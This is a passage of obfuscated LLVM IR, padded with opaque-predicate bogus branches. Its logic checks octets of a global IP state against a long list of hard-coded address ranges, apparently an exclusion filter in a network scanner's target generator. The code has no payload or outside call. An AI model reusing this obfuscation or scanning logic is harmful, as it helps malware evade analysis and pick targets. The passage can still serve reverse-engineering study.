  %4165 = icmp slt i32 %4164, 223
  %4166 = load i32, i32* @x.69
  %4167 = load i32, i32* @y.70
  %4168 = sub i32 %4166, 1
  %4169 = mul i32 %4166, %4168
  %4170 = urem i32 %4169, 2
  %4171 = icmp eq i32 %4170, 0
  %4172 = icmp slt i32 %4167, 10
  %4173 = or i1 %4171, %4172
  br i1 %4173, label %originalBBpart2574, label %originalBB572alteredBB

originalBBpart2574:                               ; preds = %originalBB572
  br i1 %4165, label %4994, label %4174

; <label>:4174:                                   ; preds = %originalBBpart2574, %4150, %4146, %4142
  %4175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4176 = zext i8 %4175 to i32
  %4177 = icmp eq i32 %4176, 199
  br i1 %4177, label %4178, label %4206

; <label>:4178:                                   ; preds = %4174
  %4179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4180 = zext i8 %4179 to i32
  %4181 = icmp eq i32 %4180, 58
  br i1 %4181, label %4182, label %4206

; <label>:4182:                                   ; preds = %4178
  %4183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4184 = zext i8 %4183 to i32
  %4185 = icmp sge i32 %4184, 184
  br i1 %4185, label %4186, label %4206

; <label>:4186:                                   ; preds = %4182
  %4187 = load i32, i32* @x.69
  %4188 = load i32, i32* @y.70
  %4189 = sub i32 %4187, 1
  %4190 = mul i32 %4187, %4189
  %4191 = urem i32 %4190, 2
  %4192 = icmp eq i32 %4191, 0
  %4193 = icmp slt i32 %4188, 10
  %4194 = or i1 %4192, %4193
  br i1 %4194, label %originalBB576, label %originalBB576alteredBB

originalBB576:                                    ; preds = %originalBB576alteredBB, %4186
  %4195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4196 = zext i8 %4195 to i32
  %4197 = icmp slt i32 %4196, 187
  %4198 = load i32, i32* @x.69
  %4199 = load i32, i32* @y.70
  %4200 = sub i32 %4198, 1
  %4201 = mul i32 %4198, %4200
  %4202 = urem i32 %4201, 2
  %4203 = icmp eq i32 %4202, 0
  %4204 = icmp slt i32 %4199, 10
  %4205 = or i1 %4203, %4204
  br i1 %4205, label %originalBBpart2578, label %originalBB576alteredBB

originalBBpart2578:                               ; preds = %originalBB576
  br i1 %4197, label %4994, label %4206

; <label>:4206:                                   ; preds = %originalBBpart2578, %4182, %4178, %4174
  %4207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4208 = zext i8 %4207 to i32
  %4209 = icmp eq i32 %4208, 206
  br i1 %4209, label %4210, label %4238

; <label>:4210:                                   ; preds = %4206
  %4211 = load i32, i32* @x.69
  %4212 = load i32, i32* @y.70
  %4213 = sub i32 %4211, 1
  %4214 = mul i32 %4211, %4213
  %4215 = urem i32 %4214, 2
  %4216 = icmp eq i32 %4215, 0
  %4217 = icmp slt i32 %4212, 10
  %4218 = or i1 %4216, %4217
  br i1 %4218, label %originalBB580, label %originalBB580alteredBB

originalBB580:                                    ; preds = %originalBB580alteredBB, %4210
  %4219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4220 = zext i8 %4219 to i32
  %4221 = icmp eq i32 %4220, 220
  %4222 = load i32, i32* @x.69
  %4223 = load i32, i32* @y.70
  %4224 = sub i32 %4222, 1
  %4225 = mul i32 %4222, %4224
  %4226 = urem i32 %4225, 2
  %4227 = icmp eq i32 %4226, 0
  %4228 = icmp slt i32 %4223, 10
  %4229 = or i1 %4227, %4228
  br i1 %4229, label %originalBBpart2582, label %originalBB580alteredBB

originalBBpart2582:                               ; preds = %originalBB580
  br i1 %4221, label %4230, label %4238

; <label>:4230:                                   ; preds = %originalBBpart2582
  %4231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4232 = zext i8 %4231 to i32
  %4233 = icmp sge i32 %4232, 172
  br i1 %4233, label %4234, label %4238

; <label>:4234:                                   ; preds = %4230
  %4235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4236 = zext i8 %4235 to i32
  %4237 = icmp slt i32 %4236, 175
  br i1 %4237, label %4994, label %4238

; <label>:4238:                                   ; preds = %4234, %4230, %originalBBpart2582, %4206
  %4239 = load i32, i32* @x.69
  %4240 = load i32, i32* @y.70
  %4241 = sub i32 %4239, 1
  %4242 = mul i32 %4239, %4241
  %4243 = urem i32 %4242, 2
  %4244 = icmp eq i32 %4243, 0
  %4245 = icmp slt i32 %4240, 10
  %4246 = or i1 %4244, %4245
  br i1 %4246, label %originalBB584, label %originalBB584alteredBB

originalBB584:                                    ; preds = %originalBB584alteredBB, %4238
  %4247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4248 = zext i8 %4247 to i32
  %4249 = icmp eq i32 %4248, 208
  %4250 = load i32, i32* @x.69
  %4251 = load i32, i32* @y.70
  %4252 = sub i32 %4250, 1
  %4253 = mul i32 %4250, %4252
  %4254 = urem i32 %4253, 2
  %4255 = icmp eq i32 %4254, 0
  %4256 = icmp slt i32 %4251, 10
  %4257 = or i1 %4255, %4256
  br i1 %4257, label %originalBBpart2586, label %originalBB584alteredBB

originalBBpart2586:                               ; preds = %originalBB584
  br i1 %4249, label %4258, label %4302

; <label>:4258:                                   ; preds = %originalBBpart2586
  %4259 = load i32, i32* @x.69
  %4260 = load i32, i32* @y.70
  %4261 = sub i32 %4259, 1
  %4262 = mul i32 %4259, %4261
  %4263 = urem i32 %4262, 2
  %4264 = icmp eq i32 %4263, 0
  %4265 = icmp slt i32 %4260, 10
  %4266 = or i1 %4264, %4265
  br i1 %4266, label %originalBB588, label %originalBB588alteredBB

originalBB588:                                    ; preds = %originalBB588alteredBB, %4258
  %4267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4268 = zext i8 %4267 to i32
  %4269 = icmp eq i32 %4268, 78
  %4270 = load i32, i32* @x.69
  %4271 = load i32, i32* @y.70
  %4272 = sub i32 %4270, 1
  %4273 = mul i32 %4270, %4272
  %4274 = urem i32 %4273, 2
  %4275 = icmp eq i32 %4274, 0
  %4276 = icmp slt i32 %4271, 10
  %4277 = or i1 %4275, %4276
  br i1 %4277, label %originalBBpart2590, label %originalBB588alteredBB

originalBBpart2590:                               ; preds = %originalBB588
  br i1 %4269, label %4278, label %4302

; <label>:4278:                                   ; preds = %originalBBpart2590
  %4279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4280 = zext i8 %4279 to i32
  %4281 = icmp sge i32 %4280, 40
  br i1 %4281, label %4282, label %4302

; <label>:4282:                                   ; preds = %4278
  %4283 = load i32, i32* @x.69
  %4284 = load i32, i32* @y.70
  %4285 = sub i32 %4283, 1
  %4286 = mul i32 %4283, %4285
  %4287 = urem i32 %4286, 2
  %4288 = icmp eq i32 %4287, 0
  %4289 = icmp slt i32 %4284, 10
  %4290 = or i1 %4288, %4289
  br i1 %4290, label %originalBB592, label %originalBB592alteredBB

originalBB592:                                    ; preds = %originalBB592alteredBB, %4282
  %4291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4292 = zext i8 %4291 to i32
  %4293 = icmp slt i32 %4292, 43
  %4294 = load i32, i32* @x.69
  %4295 = load i32, i32* @y.70
  %4296 = sub i32 %4294, 1
  %4297 = mul i32 %4294, %4296
  %4298 = urem i32 %4297, 2
  %4299 = icmp eq i32 %4298, 0
  %4300 = icmp slt i32 %4295, 10
  %4301 = or i1 %4299, %4300
  br i1 %4301, label %originalBBpart2594, label %originalBB592alteredBB

originalBBpart2594:                               ; preds = %originalBB592
  br i1 %4293, label %4994, label %4302

; <label>:4302:                                   ; preds = %originalBBpart2594, %4278, %originalBBpart2590, %originalBBpart2586
  %4303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4304 = zext i8 %4303 to i32
  %4305 = icmp eq i32 %4304, 208
  br i1 %4305, label %4306, label %4318

; <label>:4306:                                   ; preds = %4302
  %4307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4308 = zext i8 %4307 to i32
  %4309 = icmp eq i32 %4308, 93
  br i1 %4309, label %4310, label %4318

; <label>:4310:                                   ; preds = %4306
  %4311 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4312 = zext i8 %4311 to i32
  %4313 = icmp sge i32 %4312, 192
  br i1 %4313, label %4314, label %4318

; <label>:4314:                                   ; preds = %4310
  %4315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4316 = zext i8 %4315 to i32
  %4317 = icmp slt i32 %4316, 193
  br i1 %4317, label %4994, label %4318

; <label>:4318:                                   ; preds = %4314, %4310, %4306, %4302
  %4319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4320 = zext i8 %4319 to i32
  %4321 = icmp eq i32 %4320, 66
  br i1 %4321, label %4322, label %4350

; <label>:4322:                                   ; preds = %4318
  %4323 = load i32, i32* @x.69
  %4324 = load i32, i32* @y.70
  %4325 = sub i32 %4323, 1
  %4326 = mul i32 %4323, %4325
  %4327 = urem i32 %4326, 2
  %4328 = icmp eq i32 %4327, 0
  %4329 = icmp slt i32 %4324, 10
  %4330 = or i1 %4328, %4329
  br i1 %4330, label %originalBB596, label %originalBB596alteredBB

originalBB596:                                    ; preds = %originalBB596alteredBB, %4322
  %4331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4332 = zext i8 %4331 to i32
  %4333 = icmp eq i32 %4332, 71
  %4334 = load i32, i32* @x.69
  %4335 = load i32, i32* @y.70
  %4336 = sub i32 %4334, 1
  %4337 = mul i32 %4334, %4336
  %4338 = urem i32 %4337, 2
  %4339 = icmp eq i32 %4338, 0
  %4340 = icmp slt i32 %4335, 10
  %4341 = or i1 %4339, %4340
  br i1 %4341, label %originalBBpart2598, label %originalBB596alteredBB

originalBBpart2598:                               ; preds = %originalBB596
  br i1 %4333, label %4342, label %4350

; <label>:4342:                                   ; preds = %originalBBpart2598
  %4343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4344 = zext i8 %4343 to i32
  %4345 = icmp sge i32 %4344, 240
  br i1 %4345, label %4346, label %4350

; <label>:4346:                                   ; preds = %4342
  %4347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4348 = zext i8 %4347 to i32
  %4349 = icmp slt i32 %4348, 255
  br i1 %4349, label %4994, label %4350

; <label>:4350:                                   ; preds = %4346, %4342, %originalBBpart2598, %4318
  %4351 = load i32, i32* @x.69
  %4352 = load i32, i32* @y.70
  %4353 = sub i32 %4351, 1
  %4354 = mul i32 %4351, %4353
  %4355 = urem i32 %4354, 2
  %4356 = icmp eq i32 %4355, 0
  %4357 = icmp slt i32 %4352, 10
  %4358 = or i1 %4356, %4357
  br i1 %4358, label %originalBB600, label %originalBB600alteredBB

originalBB600:                                    ; preds = %originalBB600alteredBB, %4350
  %4359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4360 = zext i8 %4359 to i32
  %4361 = icmp eq i32 %4360, 98
  %4362 = load i32, i32* @x.69
  %4363 = load i32, i32* @y.70
  %4364 = sub i32 %4362, 1
  %4365 = mul i32 %4362, %4364
  %4366 = urem i32 %4365, 2
  %4367 = icmp eq i32 %4366, 0
  %4368 = icmp slt i32 %4363, 10
  %4369 = or i1 %4367, %4368
  br i1 %4369, label %originalBBpart2602, label %originalBB600alteredBB

originalBBpart2602:                               ; preds = %originalBB600
  br i1 %4361, label %4370, label %4398

; <label>:4370:                                   ; preds = %originalBBpart2602
  %4371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4372 = zext i8 %4371 to i32
  %4373 = icmp eq i32 %4372, 142
  br i1 %4373, label %4374, label %4398

; <label>:4374:                                   ; preds = %4370
  %4375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4376 = zext i8 %4375 to i32
  %4377 = icmp sge i32 %4376, 208
  br i1 %4377, label %4378, label %4398

; <label>:4378:                                   ; preds = %4374
  %4379 = load i32, i32* @x.69
  %4380 = load i32, i32* @y.70
  %4381 = sub i32 %4379, 1
  %4382 = mul i32 %4379, %4381
  %4383 = urem i32 %4382, 2
  %4384 = icmp eq i32 %4383, 0
  %4385 = icmp slt i32 %4380, 10
  %4386 = or i1 %4384, %4385
  br i1 %4386, label %originalBB604, label %originalBB604alteredBB

originalBB604:                                    ; preds = %originalBB604alteredBB, %4378
  %4387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4388 = zext i8 %4387 to i32
  %4389 = icmp slt i32 %4388, 223
  %4390 = load i32, i32* @x.69
  %4391 = load i32, i32* @y.70
  %4392 = sub i32 %4390, 1
  %4393 = mul i32 %4390, %4392
  %4394 = urem i32 %4393, 2
  %4395 = icmp eq i32 %4394, 0
  %4396 = icmp slt i32 %4391, 10
  %4397 = or i1 %4395, %4396
  br i1 %4397, label %originalBBpart2606, label %originalBB604alteredBB

originalBBpart2606:                               ; preds = %originalBB604
  br i1 %4389, label %4994, label %4398

; <label>:4398:                                   ; preds = %originalBBpart2606, %4374, %4370, %originalBBpart2602
  %4399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4400 = zext i8 %4399 to i32
  %4401 = icmp eq i32 %4400, 107
  br i1 %4401, label %4402, label %4410

; <label>:4402:                                   ; preds = %4398
  %4403 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4404 = zext i8 %4403 to i32
  %4405 = icmp sge i32 %4404, 20
  br i1 %4405, label %4406, label %4410

; <label>:4406:                                   ; preds = %4402
  %4407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4408 = zext i8 %4407 to i32
  %4409 = icmp slt i32 %4408, 24
  br i1 %4409, label %4994, label %4410

; <label>:4410:                                   ; preds = %4406, %4402, %4398
  %4411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4412 = zext i8 %4411 to i32
  %4413 = icmp eq i32 %4412, 35
  br i1 %4413, label %4414, label %4422

; <label>:4414:                                   ; preds = %4410
  %4415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4416 = zext i8 %4415 to i32
  %4417 = icmp sge i32 %4416, 159
  br i1 %4417, label %4418, label %4422

; <label>:4418:                                   ; preds = %4414
  %4419 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4420 = zext i8 %4419 to i32
  %4421 = icmp slt i32 %4420, 183
  br i1 %4421, label %4994, label %4422

; <label>:4422:                                   ; preds = %4418, %4414, %4410
  %4423 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4424 = zext i8 %4423 to i32
  %4425 = icmp eq i32 %4424, 52
  br i1 %4425, label %4426, label %4434

; <label>:4426:                                   ; preds = %4422
  %4427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4428 = zext i8 %4427 to i32
  %4429 = icmp sge i32 %4428, 1
  br i1 %4429, label %4430, label %4434

; <label>:4430:                                   ; preds = %4426
  %4431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4432 = zext i8 %4431 to i32
  %4433 = icmp slt i32 %4432, 95
  br i1 %4433, label %4994, label %4434

; <label>:4434:                                   ; preds = %4430, %4426, %4422
  %4435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4436 = zext i8 %4435 to i32
  %4437 = icmp eq i32 %4436, 52
  br i1 %4437, label %4438, label %4446

; <label>:4438:                                   ; preds = %4434
  %4439 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4440 = zext i8 %4439 to i32
  %4441 = icmp sge i32 %4440, 95
  br i1 %4441, label %4442, label %4446

; <label>:4442:                                   ; preds = %4438
  %4443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4444 = zext i8 %4443 to i32
  %4445 = icmp slt i32 %4444, 255
  br i1 %4445, label %4994, label %4446

; <label>:4446:                                   ; preds = %4442, %4438, %4434
  %4447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4448 = zext i8 %4447 to i32
  %4449 = icmp eq i32 %4448, 54
  br i1 %4449, label %4450, label %4490

; <label>:4450:                                   ; preds = %4446
  %4451 = load i32, i32* @x.69
  %4452 = load i32, i32* @y.70
  %4453 = sub i32 %4451, 1
  %4454 = mul i32 %4451, %4453
  %4455 = urem i32 %4454, 2
  %4456 = icmp eq i32 %4455, 0
  %4457 = icmp slt i32 %4452, 10
  %4458 = or i1 %4456, %4457
  br i1 %4458, label %originalBB608, label %originalBB608alteredBB

originalBB608:                                    ; preds = %originalBB608alteredBB, %4450
  %4459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4460 = zext i8 %4459 to i32
  %4461 = icmp sge i32 %4460, 64
  %4462 = load i32, i32* @x.69
  %4463 = load i32, i32* @y.70
  %4464 = sub i32 %4462, 1
  %4465 = mul i32 %4462, %4464
  %4466 = urem i32 %4465, 2
  %4467 = icmp eq i32 %4466, 0
  %4468 = icmp slt i32 %4463, 10
  %4469 = or i1 %4467, %4468
  br i1 %4469, label %originalBBpart2610, label %originalBB608alteredBB

originalBBpart2610:                               ; preds = %originalBB608
  br i1 %4461, label %4470, label %4490

; <label>:4470:                                   ; preds = %originalBBpart2610
  %4471 = load i32, i32* @x.69
  %4472 = load i32, i32* @y.70
  %4473 = sub i32 %4471, 1
  %4474 = mul i32 %4471, %4473
  %4475 = urem i32 %4474, 2
  %4476 = icmp eq i32 %4475, 0
  %4477 = icmp slt i32 %4472, 10
  %4478 = or i1 %4476, %4477
  br i1 %4478, label %originalBB612, label %originalBB612alteredBB

originalBB612:                                    ; preds = %originalBB612alteredBB, %4470
  %4479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4480 = zext i8 %4479 to i32
  %4481 = icmp slt i32 %4480, 95
  %4482 = load i32, i32* @x.69
  %4483 = load i32, i32* @y.70
  %4484 = sub i32 %4482, 1
  %4485 = mul i32 %4482, %4484
  %4486 = urem i32 %4485, 2
  %4487 = icmp eq i32 %4486, 0
  %4488 = icmp slt i32 %4483, 10
  %4489 = or i1 %4487, %4488
  br i1 %4489, label %originalBBpart2614, label %originalBB612alteredBB

originalBBpart2614:                               ; preds = %originalBB612
  br i1 %4481, label %4994, label %4490

; <label>:4490:                                   ; preds = %originalBBpart2614, %originalBBpart2610, %4446
  %4491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4492 = zext i8 %4491 to i32
  %4493 = icmp eq i32 %4492, 54
  br i1 %4493, label %4494, label %4518

; <label>:4494:                                   ; preds = %4490
  %4495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4496 = zext i8 %4495 to i32
  %4497 = icmp sge i32 %4496, 144
  br i1 %4497, label %4498, label %4518

; <label>:4498:                                   ; preds = %4494
  %4499 = load i32, i32* @x.69
  %4500 = load i32, i32* @y.70
  %4501 = sub i32 %4499, 1
  %4502 = mul i32 %4499, %4501
  %4503 = urem i32 %4502, 2
  %4504 = icmp eq i32 %4503, 0
  %4505 = icmp slt i32 %4500, 10
  %4506 = or i1 %4504, %4505
  br i1 %4506, label %originalBB616, label %originalBB616alteredBB

originalBB616:                                    ; preds = %originalBB616alteredBB, %4498
  %4507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4508 = zext i8 %4507 to i32
  %4509 = icmp slt i32 %4508, 255
  %4510 = load i32, i32* @x.69
  %4511 = load i32, i32* @y.70
  %4512 = sub i32 %4510, 1
  %4513 = mul i32 %4510, %4512
  %4514 = urem i32 %4513, 2
  %4515 = icmp eq i32 %4514, 0
  %4516 = icmp slt i32 %4511, 10
  %4517 = or i1 %4515, %4516
  br i1 %4517, label %originalBBpart2618, label %originalBB616alteredBB

originalBBpart2618:                               ; preds = %originalBB616
  br i1 %4509, label %4994, label %4518

; <label>:4518:                                   ; preds = %originalBBpart2618, %4494, %4490
  %4519 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4520 = zext i8 %4519 to i32
  %4521 = icmp eq i32 %4520, 13
  br i1 %4521, label %4522, label %4530

; <label>:4522:                                   ; preds = %4518
  %4523 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4524 = zext i8 %4523 to i32
  %4525 = icmp sge i32 %4524, 52
  br i1 %4525, label %4526, label %4530

; <label>:4526:                                   ; preds = %4522
  %4527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4528 = zext i8 %4527 to i32
  %4529 = icmp slt i32 %4528, 60
  br i1 %4529, label %4994, label %4530

; <label>:4530:                                   ; preds = %4526, %4522, %4518
  %4531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4532 = zext i8 %4531 to i32
  %4533 = icmp eq i32 %4532, 13
  br i1 %4533, label %4534, label %4542

; <label>:4534:                                   ; preds = %4530
  %4535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4536 = zext i8 %4535 to i32
  %4537 = icmp sge i32 %4536, 112
  br i1 %4537, label %4538, label %4542

; <label>:4538:                                   ; preds = %4534
  %4539 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4540 = zext i8 %4539 to i32
  %4541 = icmp slt i32 %4540, 115
  br i1 %4541, label %4994, label %4542

; <label>:4542:                                   ; preds = %4538, %4534, %4530
  %4543 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4544 = zext i8 %4543 to i32
  %4545 = icmp eq i32 %4544, 163
  br i1 %4545, label %4546, label %4550

; <label>:4546:                                   ; preds = %4542
  %4547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4548 = zext i8 %4547 to i32
  %4549 = icmp eq i32 %4548, 172
  br i1 %4549, label %4994, label %4550

; <label>:4550:                                   ; preds = %4546, %4542
  %4551 = load i32, i32* @x.69
  %4552 = load i32, i32* @y.70
  %4553 = sub i32 %4551, 1
  %4554 = mul i32 %4551, %4553
  %4555 = urem i32 %4554, 2
  %4556 = icmp eq i32 %4555, 0
  %4557 = icmp slt i32 %4552, 10
  %4558 = or i1 %4556, %4557
  br i1 %4558, label %originalBB620, label %originalBB620alteredBB

originalBB620:                                    ; preds = %originalBB620alteredBB, %4550
  %4559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4560 = zext i8 %4559 to i32
  %4561 = icmp eq i32 %4560, 51
  %4562 = load i32, i32* @x.69
  %4563 = load i32, i32* @y.70
  %4564 = sub i32 %4562, 1
  %4565 = mul i32 %4562, %4564
  %4566 = urem i32 %4565, 2
  %4567 = icmp eq i32 %4566, 0
  %4568 = icmp slt i32 %4563, 10
  %4569 = or i1 %4567, %4568
  br i1 %4569, label %originalBBpart2622, label %originalBB620alteredBB

originalBBpart2622:                               ; preds = %originalBB620
  br i1 %4561, label %4570, label %4594

; <label>:4570:                                   ; preds = %originalBBpart2622
  %4571 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4572 = zext i8 %4571 to i32
  %4573 = icmp sge i32 %4572, 15
  br i1 %4573, label %4574, label %4594

; <label>:4574:                                   ; preds = %4570
  %4575 = load i32, i32* @x.69
  %4576 = load i32, i32* @y.70
  %4577 = sub i32 %4575, 1
  %4578 = mul i32 %4575, %4577
  %4579 = urem i32 %4578, 2
  %4580 = icmp eq i32 %4579, 0
  %4581 = icmp slt i32 %4576, 10
  %4582 = or i1 %4580, %4581
  br i1 %4582, label %originalBB624, label %originalBB624alteredBB

originalBB624:                                    ; preds = %originalBB624alteredBB, %4574
  %4583 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4584 = zext i8 %4583 to i32
  %4585 = icmp slt i32 %4584, 255
  %4586 = load i32, i32* @x.69
  %4587 = load i32, i32* @y.70
  %4588 = sub i32 %4586, 1
  %4589 = mul i32 %4586, %4588
  %4590 = urem i32 %4589, 2
  %4591 = icmp eq i32 %4590, 0
  %4592 = icmp slt i32 %4587, 10
  %4593 = or i1 %4591, %4592
  br i1 %4593, label %originalBBpart2626, label %originalBB624alteredBB

originalBBpart2626:                               ; preds = %originalBB624
  br i1 %4585, label %4994, label %4594

; <label>:4594:                                   ; preds = %originalBBpart2626, %4570, %originalBBpart2622
  %4595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4596 = zext i8 %4595 to i32
  %4597 = icmp eq i32 %4596, 79
  br i1 %4597, label %4598, label %4610

; <label>:4598:                                   ; preds = %4594
  %4599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4600 = zext i8 %4599 to i32
  %4601 = icmp eq i32 %4600, 121
  br i1 %4601, label %4602, label %4610

; <label>:4602:                                   ; preds = %4598
  %4603 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4604 = zext i8 %4603 to i32
  %4605 = icmp sge i32 %4604, 128
  br i1 %4605, label %4606, label %4610

; <label>:4606:                                   ; preds = %4602
  %4607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4608 = zext i8 %4607 to i32
  %4609 = icmp slt i32 %4608, 255
  br i1 %4609, label %4994, label %4610

; <label>:4610:                                   ; preds = %4606, %4602, %4598, %4594
  %4611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4612 = zext i8 %4611 to i32
  %4613 = icmp eq i32 %4612, 212
  br i1 %4613, label %4614, label %4642

; <label>:4614:                                   ; preds = %4610
  %4615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4616 = zext i8 %4615 to i32
  %4617 = icmp eq i32 %4616, 47
  br i1 %4617, label %4618, label %4642

; <label>:4618:                                   ; preds = %4614
  %4619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4620 = zext i8 %4619 to i32
  %4621 = icmp sge i32 %4620, 224
  br i1 %4621, label %4622, label %4642

; <label>:4622:                                   ; preds = %4618
  %4623 = load i32, i32* @x.69
  %4624 = load i32, i32* @y.70
  %4625 = sub i32 %4623, 1
  %4626 = mul i32 %4623, %4625
  %4627 = urem i32 %4626, 2
  %4628 = icmp eq i32 %4627, 0
  %4629 = icmp slt i32 %4624, 10
  %4630 = or i1 %4628, %4629
  br i1 %4630, label %originalBB628, label %originalBB628alteredBB

originalBB628:                                    ; preds = %originalBB628alteredBB, %4622
  %4631 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4632 = zext i8 %4631 to i32
  %4633 = icmp slt i32 %4632, 255
  %4634 = load i32, i32* @x.69
  %4635 = load i32, i32* @y.70
  %4636 = sub i32 %4634, 1
  %4637 = mul i32 %4634, %4636
  %4638 = urem i32 %4637, 2
  %4639 = icmp eq i32 %4638, 0
  %4640 = icmp slt i32 %4635, 10
  %4641 = or i1 %4639, %4640
  br i1 %4641, label %originalBBpart2630, label %originalBB628alteredBB

originalBBpart2630:                               ; preds = %originalBB628
  br i1 %4633, label %4994, label %4642

; <label>:4642:                                   ; preds = %originalBBpart2630, %4618, %4614, %4610
